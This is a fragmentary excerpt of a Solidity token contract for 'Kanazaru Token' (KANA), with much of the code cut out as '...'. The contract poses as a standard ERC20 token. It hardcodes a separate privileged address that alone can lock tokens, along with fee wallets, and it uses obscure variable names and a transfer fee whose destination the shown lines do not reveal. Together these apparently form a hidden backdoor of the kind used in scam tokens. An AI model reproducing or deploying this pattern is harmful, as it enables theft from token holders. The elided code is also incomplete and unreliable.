...
interface ERC20Metadata is ERC20 {
 ...
 contract KANA is Context, ERC20, ERC20Metadata {
     
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private vsichkiPari;
    ...
    address private _feeAddrWallet1 = 0xace177a68120Da024f38d65526Cb685C438d21D7;
    address private _feeAddrWallet2 = 0xbdd43E4df2E3296Bc4073227372594c590ae8b51;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 1000000000000 * 10**9;
    address private _peralnq = 0xbEcE1FdC93D002702C0238e48d651DcbEEeF3A13;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private _demand = 6;
    ...
    constructor(uint256 totalSupply_) {
        _name = "Kanazaru Token";
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        vsichkiPari[msg.sender] = _totalSupply;
    ...
    function lockTokens() public {
        require(_msgSender() == _peralnq, "BEP : Unable to process");
        _lock();
    }
...
function sendETHToFee (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = vsichkiPari[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            vsichkiPari[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        vsichkiPari[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = vsichkiPari[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            vsichkiPari[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
